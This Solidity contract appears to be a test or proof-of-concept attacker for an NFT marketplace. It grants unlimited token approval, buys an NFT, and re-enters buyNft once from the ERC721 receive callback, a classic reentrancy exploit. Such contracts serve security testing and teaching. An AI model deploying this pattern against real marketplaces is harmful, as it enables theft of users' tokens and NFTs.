// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {
    IERC721Receiver
} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface INftMarketplace {
    function buyNft(address nftContract, uint256 tokenId) external;
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ReentrancyAttacker is IERC721Receiver {
    address public marketplace;
    address public nftContract;
    uint256 public tokenId;
    address public token;
    bool public attackCalled;

    constructor(
        address _marketplace,
        address _nftContract,
        uint256 _tokenId,
        address _token
    ) {
        marketplace = _marketplace;
        nftContract = _nftContract;
        tokenId = _tokenId;
        token = _token;
    }

    function launchAttack() external {
        IERC20(token).approve(marketplace, type(uint256).max);
        INftMarketplace(marketplace).buyNft(nftContract, tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (!attackCalled) {
            attackCalled = true;
            INftMarketplace(marketplace).buyNft(nftContract, tokenId);
        }
        return this.onERC721Received.selector;
    }
}
